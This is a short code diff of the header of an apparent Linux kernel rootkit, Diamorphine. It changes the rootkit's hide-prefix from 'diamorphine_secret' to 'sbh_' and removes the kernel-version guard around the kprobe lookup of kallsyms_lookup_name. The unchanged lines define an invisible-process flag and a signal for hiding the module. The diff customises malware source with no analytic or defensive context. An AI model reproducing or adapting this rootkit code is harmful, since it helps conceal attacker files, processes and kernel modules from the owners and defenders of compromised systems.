@@ -1,3 +1,4 @@
+#pragma once
 struct linux_dirent {
         unsigned long   d_ino;
         unsigned long   d_off;
@@ -5,7 +6,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "sbh_"
 
 #define PF_INVISIBLE 0x10000000
 
@@ -17,15 +18,8 @@ enum {
 	SIGMODINVIS = 63,
 };
 
-#ifndef IS_ENABLED
-#define IS_ENABLED(option) \
-(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
 static struct kprobe kp = {
 	    .symbol_name = "kallsyms_lookup_name"
 };
-#endif
